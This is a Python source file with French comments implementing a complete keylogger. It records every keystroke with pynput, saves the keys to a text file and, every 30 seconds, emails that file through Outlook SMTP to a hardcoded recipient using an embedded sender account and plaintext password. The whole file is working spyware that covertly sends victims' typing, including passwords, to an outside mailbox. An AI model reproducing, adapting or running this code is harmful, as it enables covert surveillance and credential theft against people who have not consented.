import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.utils import formatdate
from pynput import keyboard
import threading
import time

# Configuration de l'email
smtp_server = 'smtp-mail.outlook.com'
smtp_port = 587
from_email = 'a5eKeyLogger@outlook.com'
password = 'mdp?2__aazz'
to_email = 'PlasticeaterG12@outlook.com'
subject = 'Voici votre fichier texte'
body = 'Veuillez trouver en pièce jointe le fichier texte demandé.'
file_path = 'C:/Temp/touches_capturées.txt'
interval = 30  # Intervalle en secondes (10 minutes = 600 secondes)

# Liste pour stocker les touches appuyées
touche_captures = []
lock = threading.Lock()  # Verrou pour synchroniser l'accès à touche_captures

# Fonction pour envoyer un e-mail avec pièce jointe
def send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject
    
    msg.attach(MIMEText(body, 'plain', 'utf-8'))
    
    with open(file_path, 'rb') as file:
        attachment = MIMEApplication(file.read(), Name=file_path)
    attachment['Content-Disposition'] = f'attachment; filename="{file_path}"'
    msg.attach(attachment)

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as mail:
            mail.ehlo()
            mail.starttls()
            mail.ehlo()
            mail.login(from_email, password)
            mail.sendmail(from_email, to_email, msg.as_string())
            print("Email envoyé avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'email: {e}")

# Fonction appelée lorsqu'une touche est appuyée
def on_press(key):
    global touche_captures
    with lock:
        try:
            touche_captures.append(key.char)
        except AttributeError:
            touche_captures.append(str(key))

# Fonction pour envoyer les touches capturées toutes les 10 minutes
def send_keys_periodically():
    global touche_captures
    while True:
        time.sleep(interval)
        with lock:
            if touche_captures:
                # Enregistre les touches capturées dans un fichier
                with open(file_path, 'w') as file:
                    for touche in touche_captures:
                        file.write(f'{touche}\n')
                
                # Envoi de l'email avec les touches capturées
                send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path)
                
                # Vider la liste des touches après envoi
                touche_captures = []

# Démarrage du thread pour l'envoi périodique
threading.Thread(target=send_keys_periodically, daemon=True).start()

# Démarrage de l'écoute des touches
print("Démarrage de l'écoute des touches")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
